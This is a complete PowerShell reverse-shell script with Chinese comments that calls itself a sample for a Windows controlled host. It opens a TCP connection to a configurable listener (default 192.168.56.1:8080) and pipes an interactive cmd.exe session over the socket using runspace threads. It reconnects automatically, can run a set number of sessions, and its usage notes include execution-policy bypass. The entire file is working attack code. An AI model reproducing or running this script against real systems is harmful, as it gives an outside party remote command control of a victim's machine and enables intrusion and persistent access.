<#
  reverse.ps1 —— Windows 受控端「反弹交互式 Shell」样本（系统自带 Windows PowerShell 5.1）

  用法：
    powershell -NoProfile -ExecutionPolicy Bypass -File reverse.ps1 -ServerIp 192.168.56.1 -Port 8080 -Sessions 2
    powershell -NoProfile -ExecutionPolicy Bypass -File reverse.ps1 -ServerIp 192.168.56.1 -Port 8080 -OneShot

  参数：-ServerIp <ip>  -Port <n>  -Sessions <n>（0=无限，默认）  -OneShot（等价 1 个会话）
  环境变量兜底：RS_HOST=192.168.56.1  RS_PORT=8080  RS_SHELL=cmd.exe  RS_INTERVAL=5
                RS_SESSIONS  RS_ONCE=1  RS_NO_CHCP=1

  每个会话：原始 TCP 连接 → cmd.exe 子进程 → 三条转发线程
    socket → 子进程 stdin（剥 '\r'，首行注入 chcp 65001>nul）
    子进程 stdout → socket
    子进程 stderr → socket（与 stdout 共用锁，避免字节交错）
  任一侧断开：杀子进程 / 关 socket → 计一次会话 → 间隔 RS_INTERVAL 后重连，达到上限退出。

  注意：PowerShell 5.1 里 scriptblock 转 [ThreadStart] 在无 runspace 线程上执行会直接崩进程，
        因此转发线程统一用 runspace + [powershell]::BeginInvoke 承载（线程体内只调 .NET 方法）。
#>
param(
    [string]$ServerIp = "",
    [int]$Port = 0,
    [int]$Sessions = -1,
    [switch]$OneShot
)

# ---------- 配置解析：参数 > 环境变量 > 默认值 ----------
$rsHostIp = "192.168.56.1"
if ($env:RS_HOST) { $rsHostIp = $env:RS_HOST }
if ($PSBoundParameters.ContainsKey("ServerIp") -and $ServerIp -ne "") { $rsHostIp = $ServerIp }

$rsPort = 8080
if ($env:RS_PORT) {
    $tmpNum = 0
    if ([int]::TryParse($env:RS_PORT, [ref]$tmpNum) -and $tmpNum -gt 0 -and $tmpNum -lt 65536) { $rsPort = $tmpNum }
}
if ($PSBoundParameters.ContainsKey("Port") -and $Port -gt 0) { $rsPort = $Port }

$rsShell = "cmd.exe"
if ($env:RS_SHELL) { $rsShell = $env:RS_SHELL }

$rsInterval = 5.0
if ($env:RS_INTERVAL) {
    $tmpSec = 0.0
    if ([double]::TryParse($env:RS_INTERVAL, [ref]$tmpSec) -and $tmpSec -gt 0) { $rsInterval = $tmpSec }
}

$rsLimit = 0                       # 0 = 无限
if ($env:RS_SESSIONS) {
    $tmpSess = -1
    if ([int]::TryParse($env:RS_SESSIONS, [ref]$tmpSess) -and $tmpSess -ge 0) { $rsLimit = $tmpSess }
}
if ($Sessions -ge 0) { $rsLimit = $Sessions }
if ($OneShot -or $env:RS_ONCE -eq "1") { $rsLimit = 1 }

$rsNoChcp = $false
if ($env:RS_NO_CHCP -eq "1") { $rsNoChcp = $true }

if ($rsHostIp -eq "") {
    [Console]::Error.WriteLine("[reverse] 缺少目标 IP：请用 -ServerIp 或环境变量 RS_HOST")
    exit 1
}

# PowerShell 5.1 取 $proc.StandardInput 时会用 [Console]::InputEncoding 建 StreamWriter（AutoFlush），
# 该编码带 BOM 时会先往子进程 stdin 管道写 3 字节 EF BB BF，把 cmd 的第一条命令（chcp）搞坏。
# 先换成不带 BOM 的 UTF-8；换不掉（无控制台等）时退化为：首行发一个空行把 BOM 吃掉。
$rsEatBom = $true
try { [Console]::InputEncoding = New-Object System.Text.UTF8Encoding($false) } catch { }
try { if ([Console]::InputEncoding.GetPreamble().Length -eq 0) { $rsEatBom = $false } } catch { }

# ---------- 转发线程体（在各自 runspace 内执行，全程只用 .NET 方法） ----------
# 线程 1：socket -> 子进程 stdin
$rsScriptClientToProc = @'
$client = $args[0]
$proc = $args[1]
$noChcp = $args[2]
$eatBom = $args[3]
try {
    $sock = $client.GetStream()
    $stdin = $proc.StandardInput.BaseStream
    if ($eatBom) {
        $blank = [System.Text.Encoding]::ASCII.GetBytes([string][char]13 + [string][char]10)
        $stdin.Write($blank, 0, $blank.Length)
        $stdin.Flush()
    }
    if (-not $noChcp) {
        $init = [System.Text.Encoding]::ASCII.GetBytes("chcp 65001>nul" + [char]13 + [char]10)
        $stdin.Write($init, 0, $init.Length)
        $stdin.Flush()
    }
    $buf = New-Object byte[] 4096
    while ($true) {
        $n = $sock.Read($buf, 0, $buf.Length)
        if ($n -le 0) { break }
        $out = New-Object byte[] $n
        $j = 0
        for ($i = 0; $i -lt $n; $i++) {
            if ($buf[$i] -ne 13) { $out[$j] = $buf[$i]; $j = $j + 1 }   # 剥 '\r'，CRLF -> LF
        }
        if ($j -gt 0) {
            $stdin.Write($out, 0, $j)
            $stdin.Flush()
        }
    }
} catch { }
# 对端断开（或读取出错）：关 socket 并结束子进程，主线程的 WaitForExit() 随即返回
try { $client.Close() } catch { }
try { if (-not $proc.HasExited) { $proc.Kill() } } catch { }
'@

# 线程 2/3：子进程 stdout / stderr -> socket（写 socket 前加锁，防字节交错）
$rsScriptProcToClient = @'
$client = $args[0]
$stream = $args[1]
$lockObj = $args[2]
try {
    $sock = $client.GetStream()
    $buf = New-Object byte[] 8192
    while ($true) {
        $n = $stream.Read($buf, 0, $buf.Length)
        if ($n -le 0) { break }
        [System.Threading.Monitor]::Enter($lockObj)
        try {
            $sock.Write($buf, 0, $n)
            $sock.Flush()
        } finally {
            [System.Threading.Monitor]::Exit($lockObj)
        }
    }
} catch { }
'@

# 起一个转发线程：独立 runspace + PowerShell 实例，BeginInvoke 异步跑
function Start-RsForwarder {
    param([string]$Code, [object[]]$Arguments)
    $rs = [runspacefactory]::CreateRunspace()
    $rs.ApartmentState = "MTA"
    $rs.Open()
    $ps = [powershell]::Create()
    $ps.Runspace = $rs
    [void]$ps.AddScript($Code)
    foreach ($a in $Arguments) { [void]$ps.AddArgument($a) }
    $handle = $ps.BeginInvoke()
    return New-Object psobject -Property @{ Ps = $ps; Rs = $rs; Async = $handle }
}

# 收尾：等线程退出并释放 runspace（线程卡住时不强关，交给末尾兜底）
function Stop-RsForwarders {
    param($Workers)
    foreach ($w in $Workers) {
        try { if (-not $w.Async.IsCompleted) { [void]$w.Async.AsyncWaitHandle.WaitOne(3000) } } catch { }
        try {
            if ($w.Async.IsCompleted) {
                [void]$w.Ps.EndInvoke($w.Async)
                $w.Ps.Dispose()
                $w.Rs.Close()
                $w.Rs.Dispose()
            }
        } catch { }
    }
}

# ---------- 主循环 ----------
$rsHostName = $env:COMPUTERNAME
$rsCount = 0
$rsAllWorkers = New-Object System.Collections.ArrayList

[Console]::Error.WriteLine("[reverse] start: " + $rsHostName + " -> " + $rsHostIp + ":" + $rsPort + "  shell=" + $rsShell + "  sessions=" + $rsLimit + "  interval=" + $rsInterval + "s")

while ($true) {
    if ($rsLimit -gt 0 -and $rsCount -ge $rsLimit) { break }

    # ---- 连接（10 秒超时）----
    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $client.NoDelay = $true
        $ar = $client.BeginConnect($rsHostIp, $rsPort, $null, $null)
        if (-not $ar.AsyncWaitHandle.WaitOne(10000, $false)) {
            throw (New-Object System.TimeoutException("connect timeout (10s)"))
        }
        $client.EndConnect($ar)
    } catch {
        [Console]::Error.WriteLine("[reverse] connect failed: " + $_.Exception.Message)
        try { $client.Close() } catch { }
        Start-Sleep -Seconds $rsInterval
        continue
    }

    # ---- 起子进程 ----
    $proc = $null
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $rsShell
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        $psi.RedirectStandardInput = $true
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $proc = New-Object System.Diagnostics.Process
        $proc.StartInfo = $psi
        if (-not $proc.Start()) { throw (New-Object System.Exception("process start returned false")) }
    } catch {
        [Console]::Error.WriteLine("[reverse] spawn failed (" + $rsShell + "): " + $_.Exception.Message)
        try { if ($proc -ne $null) { $proc.Close() } } catch { }
        try { $client.Close() } catch { }
        Start-Sleep -Seconds $rsInterval
        continue
    }

    # ---- 三条转发线程 ----
    $lockObj = New-Object object
    $workers = New-Object System.Collections.ArrayList
    [void]$workers.Add((Start-RsForwarder -Code $rsScriptClientToProc -Arguments @($client, $proc, $rsNoChcp, $rsEatBom)))
    [void]$workers.Add((Start-RsForwarder -Code $rsScriptProcToClient -Arguments @($client, $proc.StandardOutput.BaseStream, $lockObj)))
    [void]$workers.Add((Start-RsForwarder -Code $rsScriptProcToClient -Arguments @($client, $proc.StandardError.BaseStream, $lockObj)))
    foreach ($w in $workers) { [void]$rsAllWorkers.Add($w) }

    [Console]::Error.WriteLine("[reverse] session " + ($rsCount + 1) + " up: " + ($client.Client.RemoteEndPoint.ToString()))

    # ---- 等这一轮结束：socket 断（线程 1 杀进程）或 子进程自己退出 ----
    $proc.WaitForExit()

    # ---- 收尾：关流和 socket，让阻塞中的转发线程解除 ----
    try { $proc.StandardInput.BaseStream.Close() } catch { }
    try { $proc.StandardOutput.BaseStream.Close() } catch { }
    try { $proc.StandardError.BaseStream.Close() } catch { }
    try { $client.Close() } catch { }
    try { if (-not $proc.HasExited) { $proc.Kill() } } catch { }
    Stop-RsForwarders -Workers $workers
    try { $proc.Close() } catch { }

    $rsCount = $rsCount + 1
    [Console]::Error.WriteLine("[reverse] session " + $rsCount + " closed")

    if ($rsLimit -gt 0 -and $rsCount -ge $rsLimit) { break }
    Start-Sleep -Seconds $rsInterval
}

[Console]::Error.WriteLine("[reverse] done, sessions=" + $rsCount)

# 兜底：若仍有转发线程卡住（runspace 线程是前台线程），强制退出，保证脚本能自行结束
$rsStuck = 0
foreach ($w in $rsAllWorkers) { if (-not $w.Async.IsCompleted) { $rsStuck = $rsStuck + 1 } }
if ($rsStuck -gt 0) {
    [Console]::Error.WriteLine("[reverse] warning: " + $rsStuck + " forwarder(s) still alive, force exit")
    [Environment]::Exit(0)
}
exit 0
